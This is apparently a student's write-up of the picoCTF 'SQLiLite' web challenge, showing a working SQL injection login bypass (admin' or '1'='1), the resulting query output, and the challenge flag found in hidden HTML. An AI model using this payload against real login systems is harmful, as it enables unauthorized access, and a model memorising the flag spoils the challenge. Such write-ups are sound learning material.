#  SQLiLite
- Category : Web Exploitation
- Points : 300
- Flag: picoCTF{L00k5_l1k3_y0u_solv3d_it_147ec287}



## Challenge

Can you login to this website? Try to login here.

Hint: admin is the user you want to login as.

## Solve

1) I opened the website and looked around. It was just a login screen with `Username:` and `Passowrd:` input boxes. 
2) Using the hint that admin is the user I want to log in as, I instantly knew i would have to do an SQL injection. I also noticed that whenever I inputed something, It would print it at the top of the page in like so: 

```
username: admin?
password: password
SQL query: SELECT * FROM users WHERE name='admin?' AND password='password'

Login failed.
```

3) I then researched some good methods, and came across: https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/

4) I used `admin' or '1'='1` because I knew the username is `admin` and because I knew from previous C3T lessons that `or 1=1--` was a basic method. 
5) After this the screen changed to `Logge in! But can you see the flag, it is in plainsight.`. I then looked at the pages source code below and found the flag. 

```
<pre>username: admin&#039; or &#039;1&#039;=&#039;1
password: 
SQL query: SELECT * FROM users WHERE name=&#039;admin&#039; or &#039;1&#039;=&#039;1&#039; AND password=&#039;&#039;
</pre><h1>Logged in! But can you see the flag, it is in plainsight.</h1><p hidden>Your flag is: picoCTF{L00k5_l1k3_y0u_solv3d_it_147ec287}</p>
```


## Thoughts

I really liked this challenge because it combined SQL injection and hidden HTML file types. I also thoguht it was interesting that the site printed out my inputes to the username and password field which I feel like I've seen in a previous challenge before.






